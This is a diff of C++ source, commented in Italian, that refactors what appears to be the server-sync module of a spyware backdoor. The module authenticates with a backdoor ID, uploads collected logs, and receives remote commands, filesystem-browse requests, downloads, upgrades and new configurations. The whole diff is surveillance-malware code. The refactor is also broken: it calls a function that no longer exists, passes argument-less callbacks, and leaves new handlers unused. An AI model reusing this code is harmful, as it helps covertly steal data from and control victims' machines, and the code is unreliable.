@@ -250,8 +250,10 @@ void ASP_Stop()
 	}
 }
 
-template<typename Fn, typename... Args>
-bool execute_asp_command(WORD action, BOOL wait, BOOL check_result, Fn setup, Args... args)
+template<typename FnSetup,
+	typename FnReturn,
+	typename... Args>
+bool execute_asp_command(WORD action, BOOL wait, FnSetup pre_check, FnReturn post_check, Args... args)
 {
 	if (!ASP_HostProcess || !ASP_IPC_command || ASP_IPC_command->ctrl.status != ASP_NOP)
 		return false;
@@ -260,26 +262,28 @@ bool execute_asp_command(WORD action, BOOL wait, BOOL check_result, Fn setup, Ar
 	setup(args...);
 	ASP_IPC_command->ctrl.status = ASP_FETCH;
 
-	if (check_result) {
-		if (ASP_Wait_Response() == FALSE)
-			return false;
+	if (wait) {
+		if (ASP_Wait_Response())
+			return post_check(args...);
+		
+		return false;
 	}
 
-	if (wait) {
-		return ASP_Wait_Response();
-	}
-	return true;
+	return post_check(args...);
 }
 
 static void setup_nothing()
 {
-
 }
 
+static bool post_nocheck()
+{
+	return true;
+}
 // Chiude gentilmente la connessione col server
 void ASP_Bye()
 {
-	execute_asp_command(ASP_BYE, TRUE, FALSE, setup_nothing);
+	execute_asp_command(ASP_BYE, TRUE, setup_nothing, post_nocheck);
 }
 
 static void setup_auth(char* backdoor_id, BYTE* instance_id, char* subtype, BYTE* conf_key, DWORD* response_command)
@@ -292,18 +296,19 @@ static void setup_auth(char* backdoor_id, BYTE* instance_id, char* subtype, BYTE
 	memcpy(ra->instance_id, instance_id, sizeof(ra->instance_id));
 	memcpy(ra->conf_key, conf_key, sizeof(ra->conf_key));
 }
+
+static bool post_auth(char* backdoor_id, BYTE* instance_id, char* subtype, BYTE* conf_key, DWORD* response_command)
+{
+	memcpy(response_command, &ASP_IPC_command->out_command, sizeof(DWORD));
+	return TRUE;
+}
+
 // Il core la chiama per eseguire il passo AUTH del protocollo
 // Se torna FALSE la sync dovrebbe essere interrotta
 // response_command deve essere allocato dal chiamante
 BOOL ASP_Auth(char* backdoor_id, BYTE* instance_id, char* subtype, BYTE* conf_key, DWORD* response_command)
 {
-	if (execute_asp_command(ASP_AUTH, TRUE, FALSE, setup_auth, backdoor_id, instance_id, subtype, conf_key, response_command))
-	{
-		memcpy(response_command, &ASP_IPC_command->out_command, sizeof(DWORD));
-		return TRUE;
-	}
-
-	return FALSE;
+	return execute_asp_command(ASP_AUTH, TRUE, setup_auth, post_nocheck, backdoor_id, instance_id, subtype, conf_key, response_command);
 }
 
 static void setup_id(WCHAR* username, WCHAR* device, long long* time_date, DWORD* availables, DWORD size_avail)
@@ -314,58 +319,57 @@ static void setup_id(WCHAR* username, WCHAR* device, long long* time_date, DWORD
 	_snwprintf_s(ri->username, sizeof(ri->username) / sizeof(WCHAR), _TRUNCATE, L"%s", username);
 	_snwprintf_s(ri->device, sizeof(ri->device) / sizeof(WCHAR), _TRUNCATE, L"%s", device);
 }
+
+static bool post_id(WCHAR* username, WCHAR* device, long long* time_date, DWORD* availables, DWORD size_avail)
+{
+	// Non puo' rispondere altro che proto OK, quindi ignoro out_command
+	memcpy(time_date, &ASP_IPC_command->out_param, sizeof(long long));
+	memcpy(availables, &ASP_IPC_command->out_param[sizeof(long long)], size_avail);
+	return TRUE;
+}
+
 // Il core la chiama per eseguire il passo AUTH del protocollo
 // Se torna FALSE la sync dovrebbe essere interrotta
 // time_date e availables devono essere allocati dal chiamante
 BOOL ASP_Id(WCHAR* username, WCHAR* device, long long* time_date, DWORD* availables, DWORD size_avail)
 {
-	if (execute_asp_command(ASP_IDBCK, TRUE, FALSE, setup_id, username, device, time_date, availables, size_avail))
-	{
-		// Non puo' rispondere altro che proto OK, quindi ignoro out_command
-		memcpy(time_date, &ASP_IPC_command->out_param, sizeof(long long));
-		memcpy(availables, &ASP_IPC_command->out_param[sizeof(long long)], size_avail);
-		return TRUE;
-	}
-
-	return FALSE;
-
+	return execute_asp_command(ASP_IDBCK, TRUE, setup_id, post_nocheck, username, device, time_date, availables, size_avail);
 }
 
-static void setup_getupload(BOOL is_upload, WCHAR* file_name, DWORD file_name_len, DWORD* upload_left)
+static void setup_getupload(WCHAR* file_name, DWORD file_name_len, DWORD* upload_left)
 {
 	ZeroMemory(file_name, file_name_len);
 	*upload_left = 0;
 
 }
+
+static bool post_getupload(WCHAR* file_name, DWORD file_name_len, DWORD* upload_left)
+{
+	ASP_REPLY_UPLOAD* ru;
+
+	if (ASP_IPC_command->out_command == PROTO_NO)
+		return true;
+		
+
+	ru = (ASP_REPLY_UPLOAD*)ASP_IPC_command->out_param;
+	*upload_left = ru->upload_left;
+	_snwprintf_s(file_name, file_name_len / sizeof(WCHAR), _TRUNCATE, L"%s", ru->file_name);
+
+	return true;
+}
+
 // Il core la chiama per ricevere un upload (is_upload e' TRUE) o un upgrade
 // Ritorna il file_name (deve essere allocato dal chiamante), e il numero di upload rimanenti
 // Se file_name e' tutto 0 vuol dire che c'e' stato un problema.
 // file_name_len e' in byte
 BOOL ASP_GetUpload(BOOL is_upload, WCHAR* file_name, DWORD file_name_len, DWORD* upload_left)
 {
-	ASP_REPLY_UPLOAD* ru;
-	if (is_upload && execute_asp_command(ASP_UPLO, TRUE, FALSE, setup_getupload, is_upload, file_name, file_name_len, upload_left))
-	{
-		if (ASP_IPC_command->out_command == PROTO_NO)
-			return TRUE;
-		ru = (ASP_REPLY_UPLOAD*)ASP_IPC_command->out_param;
-		*upload_left = ru->upload_left;
-		_snwprintf_s(file_name, file_name_len / sizeof(WCHAR), _TRUNCATE, L"%s", ru->file_name);
+	
+	WORD action = ASP_UPGR;
+	if (is_upload)
+		action = ASP_UPLO;
 
-		return TRUE;
-	}
-	else if (execute_asp_command(ASP_UPGR, TRUE, FALSE, setup_getupload, is_upload, file_name, file_name_len, upload_left))
-	{
-		if (ASP_IPC_command->out_command == PROTO_NO)
-			return TRUE;
-		ru = (ASP_REPLY_UPLOAD*)ASP_IPC_command->out_param;
-		*upload_left = ru->upload_left;
-		_snwprintf_s(file_name, file_name_len / sizeof(WCHAR), _TRUNCATE, L"%s", ru->file_name);
-
-		return TRUE;
-
-	}
-	return FALSE;
+	return execute_asp_command(action, TRUE, setup_getupload, post_getupload, file_name, file_name_len, upload_left);
 }
 
 static void setup_sendlog(char* file_name, DWORD byte_per_second)
@@ -375,18 +379,21 @@ static void setup_sendlog(char* file_name, DWORD byte_per_second)
 	_snwprintf_s(rl->file_name, sizeof(rl->file_name) / sizeof(WCHAR), _TRUNCATE, L"%S", file_name);
 	rl->byte_per_second = byte_per_second;
 }
+
+static bool post_sendlog(char* file_name, DWORD byte_per_second)
+{
+	// Se un log non viene spedito correttamente non lo cancella (e interrompe la sync)
+	if (ASP_IPC_command->out_command == PROTO_OK)
+		return true;
+
+	return false;
+}
+
 // Manda un file di log
 // Prende in input il path del log da mandare e il bandlimit
 BOOL ASP_SendLog(char* file_name, DWORD byte_per_second)
 {
-	if (execute_asp_command(ASP_SLOG, TRUE, FALSE, setup_sendlog, file_name, byte_per_second))
-	{
-		// Se un log non viene spedito correttamente non lo cancella (e interrompe la sync)
-		if (ASP_IPC_command->out_command == PROTO_OK)
-			return TRUE;
-
-	}
-	return FALSE;
+	return execute_asp_command(ASP_SLOG, TRUE, setup_sendlog, post_sendlog, file_name, byte_per_second);
 }
 
 static void setup_sendstatus(DWORD log_count, UINT64 log_size)
@@ -396,17 +403,19 @@ static void setup_sendstatus(DWORD log_count, UINT64 log_size)
 	rs->log_count = log_count;
 	rs->log_size = log_size;
 }
+
+static bool post_sendstatus(DWORD log_count, UINT64 log_size)
+{
+	if (ASP_IPC_command->out_command == PROTO_OK)
+		return true;
+	return false;
+
+}
 // Manda lo status dei log da spedire
 // Prende in input numero e size dei log (qword)
 BOOL ASP_SendStatus(DWORD log_count, UINT64 log_size)
 {
-	if (execute_asp_command(ASP_SSTAT, TRUE, FALSE, setup_sendstatus, log_count, log_size))
-	{
-		if (ASP_IPC_command->out_command == PROTO_OK)
-			return TRUE;
-	}
-	
-	return FALSE;
+	return execute_asp_command(ASP_SSTAT, TRUE, setup_sendstatus, post_sendstatus, log_count, log_size);
 }
 
 static void setup_receiveconf(char* conf_file_path)
@@ -416,172 +425,150 @@ static void setup_receiveconf(char* conf_file_path)
 	_snwprintf_s(rc->conf_path, sizeof(rc->conf_path) / sizeof(WCHAR), _TRUNCATE, L"%S", conf_file_path);
 
 }
+
+static bool post_receiveconf(char* conf_file_path)
+{
+	if (ASP_IPC_command->out_command == PROTO_OK)
+		return true;
+
+	return false;
+}
 // Riceve la nuova configurazione
 // Il file viene salvato nel path specificato (CONF_BU)
 BOOL ASP_ReceiveConf(char* conf_file_path)
 {
-	if (execute_asp_command(ASP_NCONF, TRUE, FALSE, setup_receiveconf, conf_file_path))
-	{
-		// Se un log non viene spedito correttamente non lo cancella (e interrompe la sync)
-		if (ASP_IPC_command->out_command == PROTO_OK)
-			return TRUE;
-	}
-
-	return FALSE;
+	return execute_asp_command(ASP_NCONF, TRUE, setup_receiveconf, post_receiveconf, conf_file_path);
 }
 
+void setup_handlepurge(long long* purge_time, DWORD* purge_size)
+{
+	return;
+}
+
+bool post_handlepurge(long long* purge_time, DWORD* purge_size)
+{
+	ASP_REPLY_PURGE* arp;
+
+	*purge_time = 0;
+	*purge_size = 0;
+
+	// Controlla il response e la lunghezza minima di una risposta
+	if (ASP_IPC_command->out_command != PROTO_OK || ASP_IPC_command->out_param_len < sizeof(ASP_REPLY_PURGE))
+		return FALSE;
+
+	// Numero di download richiesti
+	arp = (ASP_REPLY_PURGE*)ASP_IPC_command->out_param;
+	*purge_time = arp->purge_time;
+	*purge_size = arp->purge_size;
+
+	return TRUE;
+}
 // Ottiene i dati necessari per una richiesta di purge dei log
 BOOL ASP_HandlePurge(long long* purge_time, DWORD* purge_size)
 {
-	if (execute_asp_command(ASP_PURGE, TRUE, FALSE, setup_nothing))
-	{
-		ASP_REPLY_PURGE* arp;
-
-		*purge_time = 0;
-		*purge_size = 0;
-
-		// Controlla il response e la lunghezza minima di una risposta
-		if (ASP_IPC_command->out_command != PROTO_OK || ASP_IPC_command->out_param_len < sizeof(ASP_REPLY_PURGE))
-			return FALSE;
-
-		// Numero di download richiesti
-		arp = (ASP_REPLY_PURGE*)ASP_IPC_command->out_param;
-		*purge_time = arp->purge_time;
-		*purge_size = arp->purge_size;
-
-		return TRUE;
-	}
-
-	return FALSE;
+	return execute_asp_command(ASP_PURGE, TRUE, setup_nothing, post_handlepurge, purge_time, purge_size);
 }
 
-
-
-// Prende la lista delle richieste di filesystem
-// Se torna TRUE ha allocato fs_array (che va liberato) di num_elem elementi
-BOOL ASP_GetFileSystem(DWORD* num_elem, fs_browse_elem** fs_array)
+void setup_get_fs(DWORD* num_elem, fs_browse_elem** fs_array)
 {
-	if (execute_asp_command(ASP_FSYS, TRUE, FALSE, setup_nothing))
-	{
-		BYTE* ptr;
-		DWORD i, ret_len, elem_count;
-
-		*num_elem = 0;
-
-		if (ASP_IPC_command->out_command != PROTO_OK || ASP_IPC_command->out_param_len == 0)
-			return FALSE;
-
-		// Numero di download richiesti
-		ptr = ASP_IPC_command->out_param;
-		elem_count = *((DWORD*)ptr);
-		ptr += sizeof(DWORD);
-		if (elem_count == 0)
-			return FALSE;
-
-		// Alloca l'array di elementi fs
-		*fs_array = (fs_browse_elem*)calloc(elem_count, sizeof(fs_browse_elem));
-		if (!(*fs_array))
-			return FALSE;
-
-		// Valorizza gli elementi dell'array
-		// e alloca tutte le stringhe di start_dir
-		for (i = 0; i < elem_count; i++) {
-			// profondita' (prima DWORD)
-			(*fs_array)[i].depth = *((DWORD*)ptr);
-			ptr += sizeof(DWORD);
-			// start dir (stringa pascalizzata)
-			if (!((*fs_array)[i].start_dir = UnPascalizeString(ptr, &ret_len)))
-				break;
-
-			(*num_elem)++; // Torna solo il numero di stringhe effettivamente allocate
-			ptr += (ret_len + sizeof(DWORD));
-		}
-	
-		return TRUE;
-	}
-
-	return FALSE;
+	return;
 }
 
-// Prende la lista delle richieste di esecuzione comandi
-// Se torna TRUE ha allocato cmd_array (che va liberato) di num_elem elementi
-BOOL ASP_GetCommands(DWORD* num_elem, WCHAR*** cmd_array)
-{
-	if (execute_asp_command(ASP_CMDE, TRUE, FALSE, setup_nothing))
-	{
-		BYTE* ptr;
-		DWORD i, ret_len, elem_count;
-
-		*num_elem = 0;
-
-		if (ASP_IPC_command->out_command != PROTO_OK || ASP_IPC_command->out_param_len == 0)
-			return FALSE;
-
-		// Numero di download richiesti
-		ptr = ASP_IPC_command->out_param;
-		elem_count = *((DWORD*)ptr);
-		ptr += sizeof(DWORD);
-		if (elem_count == 0)
-			return FALSE;
-
-		// Alloca l'array di elementi fs
-		*cmd_array = (WCHAR**)calloc(elem_count, sizeof(WCHAR*));
-		if (!(*cmd_array))
-			return FALSE;
-
-		// Valorizza gli elementi dell'array
-		for (i = 0; i < elem_count; i++) {
-			// i comandi sono una serie di stringhe pascalizzate
-			if (!((*cmd_array)[i] = UnPascalizeString(ptr, &ret_len)))
-				break;
-
-			(*num_elem)++; // Torna solo il numero di stringhe effettivamente allocate
-			ptr += (ret_len + sizeof(DWORD));
-		}
-
-		return TRUE;
-	}
-
-	return FALSE;
-}
-
-// Prende la lista dei download
-// Se torna TRUE ha allocato string array (che va liberato) di num_elem elementi
-BOOL ASP_GetDownload(DWORD* num_elem, WCHAR*** string_array)
+bool post_get_fs(DWORD* num_elem, fs_browse_elem** fs_array)
 {
 	BYTE* ptr;
 	DWORD i, ret_len, elem_count;
 
 	*num_elem = 0;
 
-	if (execute_asp_command(ASP_DOWN, TRUE, FALSE, setup_nothing))
-	{
-		// Controlla il response e la lunghezza minima di una risposta
-		if (ASP_IPC_command->out_command != PROTO_OK || ASP_IPC_command->out_param_len < sizeof(DWORD))
-			return FALSE;
+	if (ASP_IPC_command->out_command != PROTO_OK || ASP_IPC_command->out_param_len == 0)
+		return FALSE;
 
-		// Numero di download richiesti
-		ptr = ASP_IPC_command->out_param;
-		elem_count = *((DWORD*)ptr);
+	// Numero di download richiesti
+	ptr = ASP_IPC_command->out_param;
+	elem_count = *((DWORD*)ptr);
+	ptr += sizeof(DWORD);
+	if (elem_count == 0)
+		return FALSE;
+
+	// Alloca l'array di elementi fs
+	*fs_array = (fs_browse_elem*)calloc(elem_count, sizeof(fs_browse_elem));
+	if (!(*fs_array))
+		return FALSE;
+
+	// Valorizza gli elementi dell'array
+	// e alloca tutte le stringhe di start_dir
+	for (i = 0; i < elem_count; i++) {
+		// profondita' (prima DWORD)
+		(*fs_array)[i].depth = *((DWORD*)ptr);
 		ptr += sizeof(DWORD);
-		if (elem_count == 0)
-			return FALSE;
+		// start dir (stringa pascalizzata)
+		if (!((*fs_array)[i].start_dir = UnPascalizeString(ptr, &ret_len)))
+			break;
 
-		// Alloca la lista di stringhe
-		*string_array = (WCHAR**)calloc(elem_count, sizeof(WCHAR*));
-		if (!(*string_array))
-			return FALSE;
-
-		// Alloca tutte le stringhe
-		for (i = 0; i < elem_count; i++) {
-			if (!((*string_array)[i] = UnPascalizeString(ptr, &ret_len)))
-				break;
-
-			(*num_elem)++; // Torna solo il numero di stringhe effettivamente allocate
-			ptr += (ret_len + sizeof(DWORD));
-		}
-
-		return TRUE;
+		(*num_elem)++; // Torna solo il numero di stringhe effettivamente allocate
+		ptr += (ret_len + sizeof(DWORD));
 	}
-	return FALSE;
+
+	return TRUE;
+}
+// Prende la lista delle richieste di filesystem
+// Se torna TRUE ha allocato fs_array (che va liberato) di num_elem elementi
+BOOL ASP_GetFileSystem(DWORD* num_elem, fs_browse_elem** fs_array)
+{
+	return execute_asp_command(ASP_FSYS, TRUE, setup_get_fs, post_get_fs, num_elem, fs_array);
+}
+
+void setup_get_cmd(DWORD* num_elem, WCHAR*** cmd_array)
+{
+	*num_elem = 0;
+	return;
+}
+
+bool post_get_cmd(DWORD* num_elem, WCHAR*** cmd_array)
+{
+	BYTE* ptr;
+	DWORD i, ret_len, elem_count;
+
+	*num_elem = 0;
+
+	if (ASP_IPC_command->out_command != PROTO_OK || ASP_IPC_command->out_param_len == 0)
+		return FALSE;
+
+	// Numero di download richiesti
+	ptr = ASP_IPC_command->out_param;
+	elem_count = *((DWORD*)ptr);
+	ptr += sizeof(DWORD);
+	if (elem_count == 0)
+		return FALSE;
+
+	// Alloca l'array di elementi fs
+	*cmd_array = (WCHAR**)calloc(elem_count, sizeof(WCHAR*));
+	if (!(*cmd_array))
+		return FALSE;
+
+	// Valorizza gli elementi dell'array
+	for (i = 0; i < elem_count; i++) {
+		// i comandi sono una serie di stringhe pascalizzate
+		if (!((*cmd_array)[i] = UnPascalizeString(ptr, &ret_len)))
+			break;
+
+		(*num_elem)++; // Torna solo il numero di stringhe effettivamente allocate
+		ptr += (ret_len + sizeof(DWORD));
+	}
+
+	return TRUE;
+}
+// Prende la lista delle richieste di esecuzione comandi
+// Se torna TRUE ha allocato cmd_array (che va liberato) di num_elem elementi
+BOOL ASP_GetCommands(DWORD* num_elem, WCHAR*** cmd_array)
+{
+	return execute_asp_command(ASP_CMDE, TRUE, setup_get_cmd, post_get_cmd, num_elem, cmd_array);
+}
+
+// Prende la lista dei download
+// Se torna TRUE ha allocato string array (che va liberato) di num_elem elementi
+BOOL ASP_GetDownload(DWORD* num_elem, WCHAR*** string_array)
+{
+	return execute_asp_command(ASP_DOWN, TRUE, setup_get_cmd, post_get_cmd, num_elem, string_array);
 }
